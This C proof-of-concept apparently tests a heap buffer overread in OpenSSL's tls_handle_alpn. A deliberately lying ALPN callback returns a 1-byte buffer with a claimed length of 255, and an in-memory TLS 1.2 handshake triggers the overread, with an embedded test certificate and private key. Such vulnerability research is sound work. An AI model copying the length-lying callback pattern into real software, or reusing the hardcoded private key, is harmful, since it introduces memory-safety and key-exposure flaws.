/*
 * PoC for SF15: Heap buffer overread in OPENSSL_memdup via ALPN callback
 *
 * tls_handle_alpn() in statem_srvr.c:
 *   selected_len is unsigned char (0-255)
 *   OPENSSL_memdup(selected, selected_len) copies selected_len bytes
 *   from `selected` pointer without validating that the buffer is
 *   actually that large.
 *
 * If an ALPN select callback returns selected pointing to a small buffer
 * (e.g., 1 byte "h") but sets selected_len=255, then OPENSSL_memdup
 * reads 255 bytes starting from a 1-byte buffer → heap buffer overread.
 *
 * File: openssl33/ssl/statem/statem_srvr.c
 * Function: tls_handle_alpn (line ~2219)
 */
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/x509.h>
#include <openssl/pem.h>
#include <string.h>
#include <stdio.h>

static const char *cert_pem =
    "-----BEGIN CERTIFICATE-----\n"
    "MIICzTCCAbWgAwIBAgIUO2NOYOuYq1w96lKdjoYtZhYWQVgwDQYJKoZIhvcNAQEL\n"
    "BQAwDzENMAsGA1UEAwwEdGVzdDAeFw0yNjA0MTcwNjQ2MTBaFw0yNjA0MTgwNjQ2\n"
    "MTBaMA8xDTALBgNVBAMMBHRlc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK\n"
    "AoIBAQCpkwq8tqP+fCzC2jG8IsHwhm4frKwnNs7mi3jbZPJFfBqCkQJxUWJtyDcY\n"
    "KCs1cUE0m7zoviaHmpwN1T5iwzibZ7Ey1zhE7Fa2IsotSf28V2gPhTNUXfb1Sz0c\n"
    "cn7uWxKe98iGAnewtbPYuhUeF0PfZT1nQ+Aq0lze6zaKR70ZevjJgli5B9JR2AbG\n"
    "xVZ6jgtcd2UHlGuo17U3+T75/2x59Qec78a2rVFYDsT6kJRLp+pwo+FgpgS0aCuD\n"
    "etJnDz7YREG4ObF769P/hq+AUczK39DzLmxTIKZ66lhEwurMJO5zcpMc33GWqbNQ\n"
    "mlptdJKwd2v2AP4cXOHRyHTjhwipAgMBAAGjITAfMB0GA1UdDgQWBBTXZgU9PDSb\n"
    "Gqico3UApMaQVLeKYTANBgkqhkiG9w0BAQsFAAOCAQEAhuPba1P1sV8BG1DL4svr\n"
    "kLuQcJEjYoubjHI5ZjEBMH+PWUuvu7GTR8dIITqhVD6sctTjGue8F4EGxMSm98ty\n"
    "7snxI4eeg+n17HNS0Vmd+sk/Q/AYXpYX2V4a/eq95irJUEjVWcHNAIFhnlIlExiV\n"
    "R3x+eG2fvAzP8cJH1lydqNt5+WGbPQRYj7fef7DyeSL8nEhf8VgIX8zyLauPScP8\n"
    "YSezsZb7vx/ux8QipTS5RJRLITQFYDqXfX6cRhNN+oUUm6tsycWPibeKE7VtwycW\n"
    "RQL6d/eeGR+FCWXt9HF4d9hE4gC/xXGhCSoo/jSJxEy4DMY0WMFS76kO3GxOvGoT\n"
    "Fg==\n"
    "-----END CERTIFICATE-----\n";

static const char *key_pem =
    "-----BEGIN PRIVATE KEY-----\n"
    "MIIEuwIBADANBgkqhkiG9w0BAQEFAASCBKUwggShAgEAAoIBAQCpkwq8tqP+fCzC\n"
    "2jG8IsHwhm4frKwnNs7mi3jbZPJFfBqCkQJxUWJtyDcYKCs1cUE0m7zoviaHmpwN\n"
    "1T5iwzibZ7Ey1zhE7Fa2IsotSf28V2gPhTNUXfb1Sz0ccn7uWxKe98iGAnewtbPY\n"
    "uhUeF0PfZT1nQ+Aq0lze6zaKR70ZevjJgli5B9JR2AbGxVZ6jgtcd2UHlGuo17U3\n"
    "+T75/2x59Qec78a2rVFYDsT6kJRLp+pwo+FgpgS0aCuDetJnDz7YREG4ObF769P/\n"
    "hq+AUczK39DzLmxTIKZ66lhEwurMJO5zcpMc33GWqbNQmlptdJKwd2v2AP4cXOHR\n"
    "yHTjhwipAgMBAAECgf9zAthRixQigUT569+3cpRrKdMWqf67MMoT04vnDnSVwW3h\n"
    "V+kZc8Yueri7hWDfvPAHZX/dvvJeuGVW0dKfrdhRLglZ8W/bdyNbd30Y9MXQTKLN\n"
    "3k7JiekRTwx5wPgs5knjae4uieW5UxICGp+XUO1gXrmbZmvBBc6EMqSvdg3ltZwu\n"
    "bw/XkoOTXwDGKq/eOTE1gNNS4GZdiWOQzU6WuWCiqvbCGfg4cgB7fdokijg8WB45\n"
    "tUAmiKDQAj5AbVItXUMD/m3it9hZMItAia7jBhAjS2NfsTAcfsGwOTN+eCQ41bX5\n"
    "dN34f60yQMtsuzA3Cc2+hrBhyJAUhJbEX0spF9ECgYEA3Nsv2ErLqg8+fszEAlkG\n"
    "UEVG+J4p4eGYYdxdGfIFJVa33yw49zrtR7OPxzuCFv1Mw0KczY0v+phjquuOSvXI\n"
    "g5xd098NGH2aAfi8ldeKXN06kML9lu9tIe0K7jrBGpvraQxXRv36saFMj09dw363\n"
    "WaXkp6OWRMHZm6LtgQUyKJECgYEAxI7V42069OBZZt37pvtKi26gorH+jIzzZ4En\n"
    "poZ882owU+BGRew7jxiLbGw4Oai5ZOD8HcULGoJqzO9y2ZF23se3uROqnwv9C7lz\n"
    "mHD//zKoFVN2P3q385FSaXf4i8CdfFzQQ16NQ9Noti2/+L5p18LWPsM5YnJVCkVf\n"
    "WpoVKpkCgYB8zlSESwg6qvCrITXnCb36oJuRpXePkTfWnXvzTIRB7HZt5ISwmZk7\n"
    "OqqWcPd73FqDwWHw+sdROsqf7Qt1Kt3MGhIfx92TqG7ejFyt5KbpAY+1/Krnn5ex\n"
    "Y04ZABTd35yxuWqc0KvZs4gbOEOJVVNxksDbRyOE6XL6c6D5lyEYMQKBgGEQ2HdT\n"
    "PcYn9H5kKR4xAoMQwqsVk0r9YEZA9b+6soHScsM5AfsNyevEhzWny6xNsiArKtXY\n"
    "tL8GoI9LwD/JIhaqMgRnvd6FIRVlI7yoMQNplK/TY5W9mJHjtfr3j/oTyLHdc8uR\n"
    "KdnQ0OkGdsLz5XjzcrHT3sbLB0vnLkujw8ghAoGBALOtlHtFY5EL7dThW0+5/mU7\n"
    "5GXOeELI8mdBScLn6L0ORU+Qr2RL6O3R0k2ve6fknh4CuTWi3DtpCWicgMagRNO4\n"
    "ZRkeK0HX4akE6SfQa/W/VfaMoz9F4fe057Fldu7nWVGRD7XrLuUiPl4Shvs1GY0F\n"
    "bsgSI/XTrSyV7tFwOlW7\n"
    "-----END PRIVATE KEY-----\n";

/*
 * Malicious ALPN select callback:
 * Returns selected pointing to a 1-byte buffer ("h"), but sets
 * selected_len = 255, causing OPENSSL_memdup to read 255 bytes
 * from a 1-byte heap allocation.
 *
 * This is the SF15 vulnerability - tls_handle_alpn trusts the
 * callback's selected_len without validating it against the
 * actual buffer size.
 */
static int alpn_select_cb_oob(SSL *ssl,
    const unsigned char **out, unsigned char *outlen,
    const unsigned char *in, unsigned int inlen,
    void *arg)
{
    /* Allocate exactly 1 byte - ASAN red zones will surround it */
    static unsigned char *tiny_buf = NULL;
    if (tiny_buf == NULL) {
        tiny_buf = (unsigned char *)OPENSSL_malloc(1);
        if (tiny_buf) tiny_buf[0] = 'h';
    }

    *out = tiny_buf;
    /* Lie about the length - claim 255 bytes but buffer is only 1 */
    *outlen = 255;

    printf("[ALPN_CB] Returning 1-byte buffer with outlen=255 (OOB read attempt)\n");
    return SSL_TLSEXT_ERR_OK;
}

static int do_handshake(SSL *client, SSL *server) {
    unsigned char buf[65536];
    int n;
    int client_done = 0, server_done = 0;
    int max_iter = 30;

    while ((!client_done || !server_done) && max_iter-- > 0) {
        if (!client_done) {
            int ret = SSL_do_handshake(client);
            int err = SSL_get_error(client, ret);
            if (ret == 1) client_done = 1;
            else if (err == SSL_ERROR_SSL) {
                fprintf(stderr, "[HS] Client SSL error\n");
                ERR_print_errors_fp(stderr);
                return -1;
            }
        }
        n = BIO_read(SSL_get_wbio(client), buf, sizeof(buf));
        if (n > 0) BIO_write(SSL_get_rbio(server), buf, n);

        if (!server_done) {
            int ret = SSL_do_handshake(server);
            int err = SSL_get_error(server, ret);
            if (ret == 1) server_done = 1;
            else if (err == SSL_ERROR_SSL) {
                fprintf(stderr, "[HS] Server SSL error\n");
                ERR_print_errors_fp(stderr);
                return -1;
            }
        }
        n = BIO_read(SSL_get_wbio(server), buf, sizeof(buf));
        if (n > 0) BIO_write(SSL_get_rbio(client), buf, n);

        if (client_done && server_done) return 1;
    }
    return 0;
}

int main() {
    OPENSSL_init_ssl(0, NULL);

    /* Server context */
    SSL_CTX *sctx = SSL_CTX_new(TLS_server_method());
    if (!sctx) { ERR_print_errors_fp(stderr); return 1; }

    BIO *cbio = BIO_new_mem_buf(cert_pem, -1);
    BIO *kbio = BIO_new_mem_buf(key_pem, -1);
    X509 *cert = PEM_read_bio_X509(cbio, NULL, NULL, NULL);
    EVP_PKEY *pkey = PEM_read_bio_PrivateKey(kbio, NULL, NULL, NULL);
    BIO_free(cbio); BIO_free(kbio);

    if (!cert || !pkey) {
        fprintf(stderr, "Failed to load cert/key\n");
        ERR_print_errors_fp(stderr);
        return 1;
    }
    SSL_CTX_use_certificate(sctx, cert);
    SSL_CTX_use_PrivateKey(sctx, pkey);
    X509_free(cert); EVP_PKEY_free(pkey);

    /* Force TLS 1.2 to hit non-TLS1.3 path in tls_handle_alpn */
    SSL_CTX_set_max_proto_version(sctx, TLS1_2_VERSION);
    SSL_CTX_set_min_proto_version(sctx, TLS1_2_VERSION);

    /* Register malicious ALPN select callback */
    SSL_CTX_set_alpn_select_cb(sctx, alpn_select_cb_oob, NULL);

    /* Client context */
    SSL_CTX *cctx = SSL_CTX_new(TLS_client_method());
    SSL_CTX_set_verify(cctx, SSL_VERIFY_NONE, NULL);
    SSL_CTX_set_max_proto_version(cctx, TLS1_2_VERSION);
    SSL_CTX_set_min_proto_version(cctx, TLS1_2_VERSION);

    /* Server SSL */
    SSL *server = SSL_new(sctx);
    BIO *s_rbio = BIO_new(BIO_s_mem()), *s_wbio = BIO_new(BIO_s_mem());
    SSL_set_bio(server, s_rbio, s_wbio);
    SSL_set_accept_state(server);

    /* Client SSL - advertise ALPN with "http/1.1" */
    SSL *client = SSL_new(cctx);
    BIO *c_rbio = BIO_new(BIO_s_mem()), *c_wbio = BIO_new(BIO_s_mem());
    SSL_set_bio(client, c_rbio, c_wbio);
    SSL_set_connect_state(client);
    /* Advertise ALPN to trigger the server's ALPN selection */
    const unsigned char alpn_protos[] = "\x08http/1.1";
    SSL_set_alpn_protos(client, alpn_protos, sizeof(alpn_protos) - 1);

    printf("[SF15] Running TLS 1.2 handshake with ALPN (OOB test)\n");
    int ret = do_handshake(client, server);
    if (ret == 1) {
        printf("[SF15] Handshake succeeded\n");
    } else if (ret == 0) {
        printf("[SF15] Handshake timed out\n");
    } else {
        printf("[SF15] Handshake failed\n");
    }
    ERR_print_errors_fp(stderr);

    SSL_free(server);
    SSL_free(client);
    SSL_CTX_free(sctx);
    SSL_CTX_free(cctx);
    printf("[SF15] Completed\n");
    return 0;
}
